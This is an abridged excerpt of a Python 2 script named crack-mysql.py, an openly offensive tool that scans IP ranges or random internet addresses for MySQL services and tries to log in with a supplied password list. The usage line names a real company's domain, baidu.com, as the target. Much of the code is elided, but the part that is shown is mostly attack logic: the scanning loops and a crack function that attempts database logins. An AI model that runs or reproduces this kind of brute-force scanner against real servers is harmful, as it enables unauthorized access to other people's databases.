...
# version of crack-mysql.py
VERSION = 'v0.1'


# print our nice banner ;)
def banner():
    print 'crack-mysql.py'

# print version
def version():
    print '[+] crack-mysql.py %s' % (VERSION)
    sys.exit(0)
...
def argspage():
    ...
    '  usage: ./%(prog)s -i baidu.com -L passwords.txt\n\n'
    ...
    options.add_argument('-p', default=3306, metavar='<num>',
            help='port number of mysql (default: 3306)')
    ...
    options.add_argument('-V', action='store_true',
            help='print version of crack-mysql.py and exit')
...
def ip_range(args):
    ...
    print '[*] scanning %s for mysql services' % targets
    counter = 0
...
def rand_ip(args):
    i = 0
    print '[*] scanning random ips for mysql services'
...
def crack(target, port, user, passwd, outfile, timeo, i):
    ...
    db = None
    try:
        db = mysql.connector.connect(user=user, password=passwd, database="mysql",
                host=target, port=port, connection_timeout=timeo)
...
# output when crack-mysql.py finished all routines
def finished():
    print '[*] game over!!!'
